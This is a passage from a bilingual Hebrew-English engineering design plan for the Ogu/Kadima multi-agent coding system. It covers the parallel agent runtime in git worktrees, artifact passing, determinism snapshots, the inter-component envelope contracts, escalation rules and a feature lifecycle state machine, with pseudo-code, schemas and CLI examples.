POST /api/kadima/allocate              → Allocate tasks
GET  /api/kadima/standup               → Generate standup
GET  /api/kadima/worktrees             → List active worktrees
POST /api/kadima/approve/:approvalId   → Approve a task
POST /api/kadima/deny/:approvalId      → Deny a task
```

### WebSocket Events

```
kadima:allocated      → Tasks assigned to agents
kadima:task_started   → Agent began work on task
kadima:task_completed → Agent finished task
kadima:task_blocked   → Task blocked by governance
kadima:standup        → Daily standup generated
kadima:worktree       → Worktree created/merged/cleaned
```

### אימות

1. `ogu kadima:init --feature <slug>` correctly allocates all Plan.json tasks
2. Security-sensitive tasks are correctly blocked
3. Worktrees are created and cleaned up properly
4. Standup report is accurate (matches audit trail)
5. Budget allocation per task is reasonable
6. Re-allocation works when budget/availability changes
7. Studio Kanban board shows correct state

---

## Phase 6: Multi-Agent Runtime

### מטרה
שכבת הריצה שמאפשרת ל-agents לעבוד במקביל — כל agent ב-worktree מבודד, עם העברת artifacts מובנית, conflict resolution, ואכיפת דטרמיניזם.

**זו הפאזה הכי מורכבת — תלויה בכל מה שלפניה.**

### קבצים חדשים

```
tools/ogu/commands/agent.mjs               ← CLI: agent:run, agent:status, agent:stop, agent:escalate
tools/ogu/commands/lib/agent-runtime.mjs   ← Multi-agent execution engine
tools/ogu/commands/lib/artifact-store.mjs  ← Structured artifact passing
tools/ogu/commands/lib/determinism.mjs     ← Non-determinism detection & logging
.ogu/agents/                               ← Already exists from Phase 0
.ogu/agents/{roleId}.state.json            ← Already exists from Phase 0
.ogu/artifacts/                            ← Structured artifact store
.ogu/artifacts/{featureSlug}/              ← Per-feature artifacts
.ogu/artifacts/{featureSlug}/{taskId}/     ← Per-task artifacts
```

### קבצים לעדכון

```
tools/ogu/commands/orchestrate.mjs         ← Execute waves via agent runtime
tools/ogu/commands/lib/kadima-engine.mjs   ← Trigger agent execution
tools/studio/server/api/chat.ts            ← Support multi-agent sessions
tools/studio/server/api/exec.ts            ← Agent execution endpoints
```

### Schema: Agent State (extended)

```json
{
  "roleId": "backend-dev",
  "date": "2026-02-27",
  "status": "idle | executing | blocked | escalating | exhausted",
  "currentTask": {
    "featureSlug": "auth-system",
    "taskId": "task-3",
    "worktree": ".claude/worktrees/auth-task-3",
    "startedAt": "ISO",
    "model": "sonnet",
    "tokensUsed": 45678,
    "artifacts": ["API:/users POST", "SCHEMA:users"]
  },
  "tokensUsedToday": 456789,
  "costToday": 4.56,
  "tasksCompleted": 3,
  "tasksFailed": 0,
  "escalations": 1,
  "lastAction": "ISO",
  "history": [
    {
      "taskId": "task-1",
      "completedAt": "ISO",
      "model": "sonnet",
      "cost": 0.14,
      "artifacts": ["SCHEMA:users"],
      "escalated": false
    }
  ]
}
```

### Schema: Artifact Record

```json
{
  "id": "artifact-uuid",
  "type": "FILE | API | ROUTE | COMPONENT | SCHEMA | CONTRACT | TOKEN | TEST",
  "identifier": "API:/users POST",
  "producedBy": {
    "agentId": "backend-dev",
    "taskId": "task-3",
    "featureSlug": "auth-system"
  },
  "files": [
    {
      "path": "app/api/users/route.ts",
      "hash": "sha256",
      "worktree": ".claude/worktrees/auth-task-3"
    }
  ],
  "dependencies": ["SCHEMA:users"],
  "producedAt": "ISO",
  "verified": false,
  "verifiedAt": null,
  "verifiedBy": null
}
```

### Pseudo-code: agent-runtime.mjs

```javascript
// tools/ogu/commands/lib/agent-runtime.mjs

import { createWorktree, mergeWorktree, validateWorktree } from './worktree-manager.mjs';
import { routeModel } from './model-router.mjs';
import { recordSpend, hasBudget } from './budget-tracker.mjs';
import { checkGovernance } from './governance.mjs';
import { audit } from './audit.mjs';
import { loadAgentState, saveAgentState } from './agent-registry.mjs';
import { storeArtifact, resolveArtifact } from './artifact-store.mjs';
import { execSync, spawn } from 'child_process';

/**
 * Execute a single agent task
 *
 * Lifecycle:
 * 1. Pre-check: governance, budget, dependencies
 * 2. Create worktree
 * 3. Execute skill (spawn Claude CLI)
 * 4. Collect artifacts
 * 5. Validate (run gates in worktree)
 * 6. Merge or reject
 * 7. Update state
 */
export async function executeAgentTask(root, {
  featureSlug, taskId, roleId, skillName, planTask
}) {
  const state = loadAgentState(root, roleId);
  state.status = 'executing';
  state.currentTask = { featureSlug, taskId, startedAt: new Date().toISOString() };
  saveAgentState(root, roleId, state);

  audit.taskStarted(root, { agentId: roleId, featureSlug, taskId, phase: skillName });

  try {
    // 1. Pre-check
    const govResult = checkGovernance(root, {
      agentId: roleId, featureSlug, taskId,
      filesTouched: planTask.touches || [],
      estimatedCost: 1.0
    });

    if (!govResult.allowed) {
      state.status = 'blocked';
      saveAgentState(root, roleId, state);
      return { success: false, reason: 'governance_blocked', approvals: govResult.approvals };
    }

    if (!hasBudget(root, roleId)) {
      state.status = 'exhausted';
      saveAgentState(root, roleId, state);
      return { success: false, reason: 'budget_exhausted' };
    }

    // Check input dependencies resolved
    for (const input of planTask.inputs || []) {
      const resolved = resolveArtifact(root, featureSlug, input);
      if (!resolved) {
        return { success: false, reason: 'dependency_missing', missing: input };
      }
    }

    // 2. Create worktree
    const { path: worktreePath, branch } = createWorktree(root, { featureSlug, taskId });
    state.currentTask.worktree = worktreePath;
    saveAgentState(root, roleId, state);

    // 3. Route model
    const modelResult = routeModel({
      roleId, phase: skillName, taskId,
      failureCount: 0
    });
    state.currentTask.model = modelResult.model;

    // 4. Execute skill in worktree
    const result = await executeSkill(worktreePath, {
      skill: skillName,
      model: modelResult.model,
      task: planTask,
      featureSlug
    });

    // 5. Record spend
    if (result.usage) {
      const alerts = recordSpend(root, {
        roleId, featureSlug, taskId,
        model: modelResult.model,
        provider: modelResult.provider,
        tokensIn: result.usage.tokensIn,
        tokensOut: result.usage.tokensOut,
        durationMs: result.durationMs,
        success: result.success,
        escalated: false
      });
    }

    // 6. Validate in worktree
    if (result.success) {
      const validation = validateWorktree(worktreePath);

      if (validation.passed) {
        // 7. Collect and store artifacts
        for (const output of planTask.outputs || []) {
          storeArtifact(root, {
            type: output.split(':')[0],
            identifier: output,
            producedBy: { agentId: roleId, taskId, featureSlug },
            files: detectArtifactFiles(worktreePath, output)
          });
        }

        // 8. Merge
        mergeWorktree(root, { worktreePath, branch, featureSlug, taskId });

        state.status = 'idle';
        state.tasksCompleted += 1;
        state.currentTask = null;
        saveAgentState(root, roleId, state);

        audit.taskCompleted(root, {
          agentId: roleId, featureSlug, taskId, phase: skillName,
          model: result.usage
        });

        return { success: true };
      } else {
        // Validation failed — escalate or retry
        return handleFailure(root, {
          roleId, featureSlug, taskId, skillName, planTask,
          worktreePath, branch, modelResult, validation, state
        });
      }
    } else {
      return handleFailure(root, {
        roleId, featureSlug, taskId, skillName, planTask,
        worktreePath, branch, modelResult, result, state
      });
    }

  } catch (error) {
    state.status = 'idle';
    state.tasksFailed += 1;
    state.currentTask = null;
    saveAgentState(root, roleId, state);

    audit.taskFailed(root, {
      agentId: roleId, featureSlug, taskId, phase: skillName,
      errorCode: 'OGU2601', details: error.message
    });

    return { success: false, reason: 'error', error: error.message };
  }
}

/**
 * Handle task failure — retry with escalation or report
 */
async function handleFailure(root, {
  roleId, featureSlug, taskId, skillName, planTask,
  worktreePath, branch, modelResult, failResult, state
}) {
  state.tasksFailed += 1;

  // Check if escalation is possible
  const nextModel = routeModel({
    roleId, phase: skillName, taskId,
    failureCount: state.tasksFailed
  });

  if (nextModel.model !== modelResult.model) {
    // Escalate — retry with stronger model
    state.escalations += 1;
    state.status = 'escalating';
    saveAgentState(root, roleId, state);

    audit.emitAudit(root, {
      type: 'model_escalated',
      agentId: roleId, featureSlug, taskId,
      model: { from: modelResult.model, to: nextModel.model }
    });

    // Cleanup failed worktree and retry
    execSync(`git worktree remove "${worktreePath}" --force`, { cwd: root });
    execSync(`git branch -D "${branch}"`, { cwd: root });

    return executeAgentTask(root, {
      featureSlug, taskId, roleId, skillName, planTask
    });
  }

  // No more escalation — report failure
  state.status = 'idle';
  state.currentTask = null;
  saveAgentState(root, roleId, state);

  audit.taskFailed(root, {
    agentId: roleId, featureSlug, taskId, phase: skillName,
    errorCode: 'OGU2602', details: 'Max escalation reached'
  });

  return { success: false, reason: 'max_escalation_reached' };
}

/**
 * Execute a wave of tasks in parallel
 */
export async function executeWave(root, featureSlug, wave, allocations) {
  const tasks = wave.tasks.map(taskId => {
    const allocation = allocations.find(a => a.taskId === taskId);
    return executeAgentTask(root, {
      featureSlug,
      taskId,
      roleId: allocation.assignedTo,
      skillName: 'build',
      planTask: /* load from Plan.json */
    });
  });

  // Execute all tasks in wave concurrently
  const results = await Promise.allSettled(tasks);

  return {
    wave: wave.wave,
    results: results.map((r, i) => ({
      taskId: wave.tasks[i],
      ...r.value || { success: false, reason: r.reason }
    }))
  };
}

/**
 * Execute full DAG — wave by wave
 */
export async function executeDAG(root, featureSlug) {
  const allocations = loadAllocations(root, featureSlug);
  const dag = loadDAG(root, featureSlug);

  for (const wave of dag.waves) {
    const waveResult = await executeWave(root, featureSlug, wave, allocations.allocations);

    const allPassed = waveResult.results.every(r => r.success);
    if (!allPassed) {
      const failed = waveResult.results.filter(r => !r.success);
      // Check if any are on critical path
      const criticalFailures = failed.filter(f =>
        dag.critical_path.includes(f.taskId)
      );

      if (criticalFailures.length > 0) {
        return { success: false, reason: 'critical_path_failure', failedWave: wave.wave, failures: failed };
      }
      // Non-critical failures — continue with next wave
    }
  }

  return { success: true };
}
```

### Pseudo-code: artifact-store.mjs

```javascript
// tools/ogu/commands/lib/artifact-store.mjs

import { mkdirSync, writeFileSync } from 'fs';
import { readJsonSafe, repoRoot } from '../../util.mjs';
import { join } from 'path';

const STORE_DIR = '.ogu/artifacts';

/**
 * Store a produced artifact
 */
export function storeArtifact(root, artifact) {
  const dir = join(root, STORE_DIR, artifact.producedBy.featureSlug, artifact.producedBy.taskId);
  mkdirSync(dir, { recursive: true });

  const record = {
    id: generateId(),
    ...artifact,
    producedAt: new Date().toISOString(),
    verified: false
  };

  const filename = artifact.identifier.replace(/[/:]/g, '_') + '.json';
  writeFileSync(join(dir, filename), JSON.stringify(record, null, 2));

  // Update index
  updateArtifactIndex(root, artifact.producedBy.featureSlug, record);

  return record;
}

/**
 * Resolve an artifact dependency
 * Returns the artifact record if it exists and is verified, null otherwise
 */
export function resolveArtifact(root, featureSlug, identifier) {
  const indexPath = join(root, STORE_DIR, featureSlug, 'index.json');
  const index = readJsonSafe(indexPath) || { artifacts: {} };
  return index.artifacts[identifier] || null;
}

/**
 * Mark artifact as verified (after gate passes)
 */
export function verifyArtifact(root, featureSlug, identifier, verifiedBy) {
  const artifact = resolveArtifact(root, featureSlug, identifier);
  if (artifact) {
    artifact.verified = true;
    artifact.verifiedAt = new Date().toISOString();
    artifact.verifiedBy = verifiedBy;
    // Write back
  }
}
```

### Pseudo-code: determinism.mjs

```javascript
// tools/ogu/commands/lib/determinism.mjs

import { audit } from './audit.mjs';

/**
 * Log non-deterministic behavior
 *
 * Every time the system encounters non-deterministic output
 * (different output for same input), it must be logged.
 */
export function logNonDeterminism(root, {
  agentId, taskId, featureSlug,
  input, expectedOutput, actualOutput,
  cause
}) {
  audit.emitAudit(root, {
    type: 'non_deterministic',
    agentId,
    featureSlug,
    taskId,
    context: {
      input: hashObject(input),
      expectedOutput: hashObject(expectedOutput),
      actualOutput: hashObject(actualOutput),
      cause, // "model_temperature", "external_api", "timing", "random"
      delta: diff(expectedOutput, actualOutput)
    },
    tags: ['non-deterministic']
  });
}

/**
 * Create a deterministic snapshot of system state
 * Used for replay verification
 */
export function captureSnapshot(root, featureSlug) {
  return {
    timestamp: new Date().toISOString(),
    orgSpecHash: hashFile(join(root, '.ogu/OrgSpec.json')),
    planHash: hashFile(join(root, `docs/vault/04_Features/${featureSlug}/Plan.json`)),
    specHash: hashFile(join(root, `docs/vault/04_Features/${featureSlug}/Spec.md`)),
    contextLockHash: hashFile(join(root, '.ogu/CONTEXT_LOCK.json')),
    modelConfig: hashFile(join(root, '.ogu/model-config.json')),
    policies: hashFile(join(root, '.ogu/governance/policies.json'))
  };
}

/**
 * Compare two snapshots to verify determinism
 */
export function verifyDeterminism(snapshot1, snapshot2) {
  const diffs = [];
  for (const key of Object.keys(snapshot1)) {
    if (snapshot1[key] !== snapshot2[key]) {
      diffs.push({ field: key, before: snapshot1[key], after: snapshot2[key] });
    }
  }
  return { deterministic: diffs.length === 0, diffs };
}
```

### CLI Commands

**`ogu agent:run`**
```
Usage: ogu agent:run --feature <slug> [--task <id>] [--wave <n>] [--all]

Execute agent task(s).
  --task <id>    Run specific task
  --wave <n>     Run specific wave
  --all          Run full DAG (all waves sequentially)

Example:
  $ ogu agent:run --feature auth-system --wave 1
  WAVE 1 — 3 tasks in parallel:

  ┌ task-1 (backend-dev, sonnet)
  │ Creating worktree... ✓
  │ Executing build skill...
  │ ████████████████████ 100%
  │ Artifacts: SCHEMA:users ✓
  │ Validation: passed ✓
  │ Merging... ✓
  │ Cost: $0.14
  │
  ├ task-2 (backend-dev, sonnet)
  │ Creating worktree... ✓
  │ Executing build skill...
  │ ██████████████░░░░░░ 70% → FAILED
  │ Escalating: sonnet → opus
  │ Retrying...
  │ ████████████████████ 100%
  │ Artifacts: API:/users POST ✓
  │ Validation: passed ✓
  │ Merging... ✓
  │ Cost: $0.59 (escalated)
  │
  └ task-3 (frontend-dev, sonnet)
    Creating worktree... ✓
    Executing build skill...
    ████████████████████ 100%
    Artifacts: COMPONENT:UserList, ROUTE:/users ✓
    Validation: passed ✓
    Merging... ✓
    Cost: $0.22

  WAVE 1 COMPLETE: 3/3 passed, $0.95 total, 1 escalation
```

**`ogu agent:status`**
```
Usage: ogu agent:status [--agent <roleId>]

Example:
  $ ogu agent:status
  AGENT         STATUS     TASK      MODEL   TODAY     TASKS  FAILS
  backend-dev   idle       —         —       $4.56     3/0    —
  frontend-dev  executing  task-5    sonnet  $2.34     2/0    —
  qa            idle       —         —       $0.00     0/0    —
  architect     idle       —         —       $8.90     1/0    —
  security      blocked    task-7    opus    $0.00     0/0    governance
```

**`ogu agent:stop`**
```
Usage: ogu agent:stop --agent <roleId> [--force]

Stop an executing agent. --force kills immediately and cleans up worktree.
```

**`ogu agent:escalate`**
```
Usage: ogu agent:escalate --agent <roleId> --to <roleId|model>

Manually escalate an agent to a stronger model or different role.
```

### Studio UI: Agent Runtime Dashboard

- **Agent grid**: Card per active agent showing:
  - Role name and current status (idle/executing/blocked/escalating)
  - Current task with progress bar
  - Model being used
  - Token/cost counter (live updating)
  - Escalation indicator
- **DAG visualization**: Interactive graph of task dependencies
  - Color-coded: green (complete), blue (active), gray (pending), red (failed), yellow (blocked)
  - Click task → shows agent details, artifacts, cost
- **Artifact flow**: Visual showing how artifacts flow between tasks
  - Input dependencies (arrows in)
  - Output productions (arrows out)
  - Unresolved dependencies highlighted
- **Live terminal**: Per-agent output stream
- **Wave progress**: Horizontal bar showing wave completion

### Studio API Endpoints

```
POST /api/agent/run                        → Execute task(s)
GET  /api/agent/status                     → All agent states
GET  /api/agent/:roleId                    → Specific agent state
POST /api/agent/:roleId/stop               → Stop agent
POST /api/agent/:roleId/escalate           → Manual escalation
GET  /api/artifacts/:featureSlug           → List artifacts for feature
GET  /api/artifacts/:featureSlug/:taskId   → List artifacts for task
GET  /api/dag/:featureSlug                 → DAG visualization data
```

### WebSocket Events

```
agent:started         → Agent began executing (roleId, taskId)
agent:progress        → Progress update (roleId, percentage, output)
agent:completed       → Agent finished task (roleId, taskId, cost, artifacts)
agent:failed          → Agent task failed (roleId, taskId, error)
agent:escalated       → Model escalation (roleId, from, to)
agent:blocked         → Agent blocked (roleId, reason)
artifact:produced     → New artifact available
artifact:verified     → Artifact passed validation
dag:wave_started      → Wave began execution
dag:wave_completed    → Wave finished
dag:completed         → Full DAG completed
```

### אימות

1. Single task executes in isolated worktree and merges correctly
2. Parallel wave executes tasks concurrently
3. Task failure triggers model escalation (sonnet → opus)
4. Max escalation reached → task reported as failed
5. Critical path failure stops DAG execution
6. Non-critical failure allows next wave to continue
7. Artifacts are stored and resolvable by downstream tasks
8. Budget is tracked per-task and per-agent
9. Governance blocks are enforced (blocked tasks don't execute)
10. Worktrees are cleaned up after merge/failure
11. Studio DAG visualization updates in real-time
12. All events flow through audit trail
13. Determinism snapshot captures full system state

---

## Cross-Cutting: 8 חוזים מבניים

> שמונה חוזים מבניים שחייבים כיסוי כדי שהמערכת תשרוד 5-10 שנים.
> כל אחד חוצה פאזות — הם לא שייכים לפאזה ספציפית אלא לתשתית עצמה.
> Fix 1-5: מונעים שבירה מבנית. Fix 6-8: מבטיחים שהמערכת חיה, לומדת, ובטוחה.

---

### Fix 1: Kadima ↔ Ogu Contract

**הבעיה:** Kadima ו-Ogu מוגדרים כישויות נפרדות, אבל אין חוזה קשיח שמגדיר מה עובר ביניהם. בלי גבול — תיווצר זליגה: Kadima תתחיל "לחשוב טכנית", Ogu יתחיל "להחליט ארגונית".

**קובץ חדש:** `docs/vault/02_Contracts/Kadima_Ogu.contract.md`

**Schema: InputEnvelope (Kadima → Ogu)**

```json
{
  "$schema": "KadimaOgu/InputEnvelope/1.0",
  "envelopeId": "uuid",
  "timestamp": "ISO",
  "source": "kadima",
  "target": "ogu",

  "command": "execute_task | validate_artifact | run_gate | compile_feature",

  "payload": {
    "featureSlug": "auth-system",
    "taskId": "task-3",
    "assignedAgent": {
      "roleId": "backend-dev",
      "model": "sonnet",
      "budgetCap": 2.00,
      "allowedTools": ["Read", "Write", "Edit", "Bash", "Glob", "Grep"],
      "ownershipScope": ["src/api/**", "src/lib/db/**"],
      "timeoutMs": 300000
    },
    "planTask": {
      "title": "Build user API endpoint",
      "spec_section": "3.2",
      "inputs": ["SCHEMA:users"],
      "outputs": ["API:/users POST", "API:/users GET"],
      "touches": ["src/api/users/", "src/lib/db/users.ts"],
      "done_when": "API endpoints return valid responses"
    },
    "worktreePath": ".claude/worktrees/auth-task-3",
    "contextSnapshot": {
      "specHash": "sha256",
      "planHash": "sha256",
      "contextLockHash": "sha256"
    }
  },

  "constraints": {
    "maxTokens": 500000,
    "maxCost": 2.00,
    "maxRetries": 2,
    "escalationAllowed": true,
    "mustProduceArtifacts": true
  }
}
```

**Schema: OutputEnvelope (Ogu → Kadima)**

```json
{
  "$schema": "KadimaOgu/OutputEnvelope/1.0",
  "envelopeId": "uuid",
  "inReplyTo": "input-envelope-uuid",
  "timestamp": "ISO",
  "source": "ogu",
  "target": "kadima",

  "status": "success | failure | partial | blocked | timeout",

  "result": {
    "taskId": "task-3",
    "artifactsProduced": [
      {
        "identifier": "API:/users POST",
        "path": "src/api/users/route.ts",
        "hash": "sha256",
        "verified": true
      }
    ],
    "artifactsMissing": [],
    "gateResults": [
      { "gate": "typecheck", "status": "passed" },
      { "gate": "unit_tests", "status": "passed" }
    ],
    "usage": {
      "model": "sonnet",
      "tokensIn": 45678,
      "tokensOut": 12345,
      "cost": 0.89,
      "durationMs": 45000,
      "escalations": 0
    }
  },

  "errors": [
    {
      "code": "OGU0501",
      "message": "Type error in users.ts:34",
      "severity": "error",
      "recoverable": true
    }
  ]
}
```

**Schema: ErrorEnvelope (Ogu → Kadima, on unrecoverable failure)**

```json
{
  "$schema": "KadimaOgu/ErrorEnvelope/1.0",
  "envelopeId": "uuid",
  "inReplyTo": "input-envelope-uuid",
  "timestamp": "ISO",
  "source": "ogu",
  "target": "kadima",

  "errorClass": "budget_exhausted | governance_blocked | dependency_missing | max_escalation | timeout | internal_error",
  "errorCode": "OGU2602",
  "message": "Max escalation reached after 3 attempts",
  "context": {
    "attemptsMap": [
      { "model": "haiku", "result": "failed", "error": "OGU0501" },
      { "model": "sonnet", "result": "failed", "error": "OGU0501" },
      { "model": "opus", "result": "failed", "error": "OGU0501" }
    ],
    "totalCost": 4.56,
    "totalTokens": 890123
  },
  "recommendation": "replan | manual_intervention | skip_task | change_spec"
}
```

**Schema: EscalationProtocol**

```json
{
  "$schema": "KadimaOgu/EscalationProtocol/1.0",
  "triggers": [
    {
      "condition": "ogu.failure_count >= 3 AND ogu.escalation_exhausted",
      "action": "escalate_to_kadima",
      "kadimaResponse": "replan_task | reassign_agent | request_human_override | abort_feature"
    },
    {
      "condition": "ogu.budget_exceeded",
      "action": "escalate_to_kadima",
      "kadimaResponse": "allocate_more_budget | downgrade_model | pause_feature"
    },
    {
      "condition": "ogu.governance_blocked AND timeout > 4h",
      "action": "escalate_to_kadima",
      "kadimaResponse": "auto_approve_if_low_risk | escalate_to_human | abort_task"
    },
    {
      "condition": "ogu.dependency_missing AND no_producing_task",
      "action": "escalate_to_kadima",
      "kadimaResponse": "replan_dag | create_missing_task | request_human_input"
    }
  ],
  "authorityRules": {
    "kadima_decides": ["task_assignment", "budget_allocation", "approval_routing", "replan", "abort"],
    "ogu_decides": ["model_selection_within_budget", "retry_strategy", "gate_execution", "artifact_validation"],
    "conflict_resolution": "kadima_wins — Kadima is the authority on 'what' and 'who'. Ogu is the authority on 'how'."
  }
}
```

**Pseudo-code: envelope validation**

```javascript
// tools/ogu/commands/lib/envelope.mjs

/**
 * Validate an InputEnvelope from Kadima before Ogu processes it
 */
export function validateInputEnvelope(envelope) {
  const errors = [];

  if (!envelope.envelopeId) errors.push('OGU2701: Missing envelopeId');
  if (!envelope.command) errors.push('OGU2702: Missing command');
  if (!envelope.payload?.taskId) errors.push('OGU2703: Missing taskId');
  if (!envelope.payload?.assignedAgent?.roleId) errors.push('OGU2704: Missing agent roleId');
  if (!envelope.constraints) errors.push('OGU2705: Missing constraints');

  // Verify context snapshot matches current state
  const currentLock = loadContextLock();
  if (envelope.payload.contextSnapshot?.specHash !== currentLock.specHash) {
    errors.push('OGU2706: Spec hash mismatch — context has drifted since allocation');
  }

  return { valid: errors.length === 0, errors };
}

/**
 * Validate an OutputEnvelope from Ogu before Kadima processes it
 */
export function validateOutputEnvelope(envelope) {
  const errors = [];

  if (!envelope.inReplyTo) errors.push('Missing inReplyTo reference');
  if (!envelope.status) errors.push('Missing status');

  if (envelope.status === 'success') {
    if (!envelope.result?.artifactsProduced?.length) {
      errors.push('Success status but no artifacts produced');
    }
  }

  return { valid: errors.length === 0, errors };
}
```

**כלל ברזל:** Kadima מחליטה **מה** ו**מי**. Ogu מחליט **איך**. במקרה סתירה — Kadima מנצחת.

---

### Fix 2: Global Feature State Machine

**הבעיה:** אין state machine פורמלית ל-Feature Lifecycle. בלעדיה, ייווצרו מצבים לא מוגדרים (QA עובר אבל Architect לא, critical path נכשל אבל לא קריטי, human override ואז escalation).

**קובץ חדש:** `docs/vault/02_Contracts/FeatureLifecycle.contract.md`

**Schema: Feature State Machine**

```json
{
  "$schema": "FeatureLifecycle/1.0",

  "states": [
    "draft",
    "specced",
    "planned",
    "designed",
    "allocated",
    "in_progress",
    "in_review",
    "verified",
    "released",
    "archived",
    "failed",
    "suspended"
  ],

  "transitions": [
    { "from": "draft",        "to": "specced",      "trigger": "spec_complete",        "guard": "has_PRD AND has_Spec_skeleton AND has_QA",     "phase": "feature" },
    { "from": "specced",      "to": "planned",       "trigger": "plan_complete",        "guard": "has_Spec_filled AND has_Plan_json AND ir_valid", "phase": "architect" },
    { "from": "planned",      "to": "designed",      "trigger": "design_complete",      "guard": "has_DESIGN_md AND has_design_tokens",           "phase": "design" },
    { "from": "designed",     "to": "allocated",     "trigger": "kadima_allocated",     "guard": "all_tasks_assigned AND governance_checked",      "phase": "kadima" },
    { "from": "allocated",    "to": "in_progress",   "trigger": "first_task_started",   "guard": "at_least_one_agent_executing",                   "phase": "build" },
    { "from": "in_progress",  "to": "in_review",     "trigger": "all_tasks_complete",   "guard": "all_outputs_produced AND no_critical_failures",  "phase": "build" },
    { "from": "in_review",    "to": "verified",      "trigger": "gates_passed",         "guard": "compile_success AND all_14_gates_pass",          "phase": "done" },
    { "from": "verified",     "to": "released",      "trigger": "deploy_complete",      "guard": "preview_healthy AND smoke_passed",               "phase": "preview" },
    { "from": "released",     "to": "archived",      "trigger": "feature_archived",     "guard": "no_open_issues AND observation_clean",            "phase": "observe" },

    { "from": "in_progress",  "to": "failed",        "trigger": "critical_failure",     "guard": "critical_path_exhausted AND max_escalation",     "phase": "build" },
    { "from": "in_review",    "to": "failed",        "trigger": "gate_failure",         "guard": "compile_failed AND no_fix_possible",             "phase": "done" },
    { "from": "failed",       "to": "planned",       "trigger": "replan",               "guard": "new_plan_json_created",                          "phase": "architect" },
    { "from": "failed",       "to": "suspended",     "trigger": "suspend",              "guard": "human_decision",                                 "phase": "kadima" },

    { "from": "*",            "to": "suspended",     "trigger": "human_suspend",        "guard": "override_record_created",                        "phase": "governance" },
    { "from": "suspended",    "to": "allocated",     "trigger": "resume",               "guard": "override_record_created AND reallocation_done",  "phase": "kadima" }
  ],

  "invalidTransitions": [
    { "from": "draft",       "to": "in_progress",  "reason": "Cannot build without spec + plan" },
    { "from": "specced",     "to": "in_progress",  "reason": "Cannot build without plan + design" },
    { "from": "planned",     "to": "in_progress",  "reason": "Cannot build without Kadima allocation" },
    { "from": "in_progress", "to": "released",     "reason": "Cannot release without verification" },
    { "from": "verified",    "to": "draft",        "reason": "Cannot regress verified feature to draft" },
    { "from": "archived",    "to": "*",            "reason": "Archived is terminal" }
  ]
}
```

**Pseudo-code: state-machine.mjs**

```javascript
// tools/ogu/commands/lib/state-machine.mjs

import { readJsonSafe, repoRoot } from '../../util.mjs';
import { audit } from './audit.mjs';
import { join } from 'path';

const LIFECYCLE_CONTRACT = 'docs/vault/02_Contracts/FeatureLifecycle.contract.md';
const FEATURE_STATE_PATH = (slug) => `docs/vault/04_Features/${slug}/STATE.json`;

/**
 * Feature state record
 */
const defaultState = (slug) => ({
  featureSlug: slug,
  currentState: 'draft',
  stateHistory: [],
  createdAt: new Date().toISOString(),
  lastTransition: null
});

/**
 * Attempt a state transition
 * Returns { success, newState, error }
 */
export function transition(root, featureSlug, trigger, metadata = {}) {
  const lifecycle = loadLifecycle();
  const featureState = loadFeatureState(root, featureSlug);
  const currentState = featureState.currentState;

  // Find matching transition
  const candidates = lifecycle.transitions.filter(t =>
    (t.from === currentState || t.from === '*') && t.trigger === trigger
  );

  if (candidates.length === 0) {
    // Check if this is an explicitly invalid transition
    const invalid = lifecycle.invalidTransitions.find(t =>
      t.from === currentState
    );

    const error = invalid
      ? `OGU2801: Invalid transition from '${currentState}' via '${trigger}': ${invalid.reason}`
      : `OGU2802: No transition defined from '${currentState}' via '${trigger}'`;

    audit.emitAudit(root, {
      type: 'state_transition_rejected',
      featureSlug,
      context: { from: currentState, trigger, error }
    });

    return { success: false, error };
  }

  const trans = candidates[0];

  // Evaluate guard
  const guardResult = evaluateGuard(root, featureSlug, trans.guard);
  if (!guardResult.passed) {
    return {
      success: false,
      error: `OGU2803: Guard failed for '${trans.trigger}': ${guardResult.reason}`
    };
  }

  // Apply transition
  const previousState = currentState;
  featureState.currentState = trans.to;
  featureState.lastTransition = {
    from: previousState,
    to: trans.to,
    trigger,
    phase: trans.phase,
    timestamp: new Date().toISOString(),
    metadata
  };
  featureState.stateHistory.push(featureState.lastTransition);

  saveFeatureState(root, featureSlug, featureState);

  // Audit
  audit.emitAudit(root, {
    type: 'state_transition',
    featureSlug,
    context: {
      from: previousState,
      to: trans.to,
      trigger,
      phase: trans.phase,
      guard: trans.guard
    }
  });

  return { success: true, newState: trans.to, previousState };
}

/**
 * Get current state of a feature
 */
export function getState(root, featureSlug) {
  return loadFeatureState(root, featureSlug).currentState;
}

/**
 * Get all valid transitions from current state
 */
export function availableTransitions(root, featureSlug) {
  const lifecycle = loadLifecycle();
  const currentState = getState(root, featureSlug);

  return lifecycle.transitions
    .filter(t => t.from === currentState || t.from === '*')
    .map(t => ({
      trigger: t.trigger,
      targetState: t.to,
      guard: t.guard,
      phase: t.phase
    }));
}

/**
 * Evaluate a guard condition
 */
function evaluateGuard(root, featureSlug, guard) {
  const featureDir = join(root, 'docs/vault/04_Features', featureSlug);
  const checks = {
    'has_PRD': () => fileExists(join(featureDir, 'PRD.md')),
    'has_Spec_skeleton': () => fileExists(join(featureDir, 'Spec.md')),
    'has_Spec_filled': () => fileHasContent(join(featureDir, 'Spec.md'), 500),
    'has_QA': () => fileExists(join(featureDir, 'QA.md')),
    'has_Plan_json': () => fileExists(join(featureDir, 'Plan.json')),
    'ir_valid': () => validateIR(root, featureSlug),
    'has_DESIGN_md': () => fileExists(join(featureDir, 'DESIGN.md')),
    'has_design_tokens': () => fileExists(join(root, 'design.tokens.json')),
    'all_tasks_assigned': () => checkAllTasksAssigned(root, featureSlug),
    'governance_checked': () => checkGovernanceComplete(root, featureSlug),
    'all_outputs_produced': () => checkAllOutputsProduced(root, featureSlug),
    'compile_success': () => checkCompileSuccess(root, featureSlug),
    'all_14_gates_pass': () => checkAllGatesPass(root, featureSlug),
    'override_record_created': () => true, // checked by caller
    // ... more guards
  };

  const conditions = guard.split(' AND ').map(c => c.trim());
  for (const condition of conditions) {
    const checker = checks[condition];
    if (checker && !checker()) {
      return { passed: false, reason: `Guard '${condition}' failed` };
    }
  }
  return { passed: true };
}
```

**CLI: `ogu feature:state`**
```
Usage: ogu feature:state <slug> [--transition <trigger>] [--history] [--available]

Example:
  $ ogu feature:state auth-system
  Feature: auth-system
  State:   in_progress
  Since:   2026-02-27 14:00

  $ ogu feature:state auth-system --available
  Available transitions:
    all_tasks_complete → in_review    (guard: all_outputs_produced AND no_critical_failures)
    critical_failure   → failed       (guard: critical_path_exhausted AND max_escalation)
    human_suspend      → suspended    (guard: override_record_created)

  $ ogu feature:state auth-system --history
  draft → specced        │ 2026-02-20 09:00 │ spec_complete      │ feature
  specced → planned      │ 2026-02-20 11:00 │ plan_complete      │ architect
  planned → designed     │ 2026-02-21 10:00 │ design_complete    │ design
  designed → allocated   │ 2026-02-21 14:00 │ kadima_allocated   │ kadima
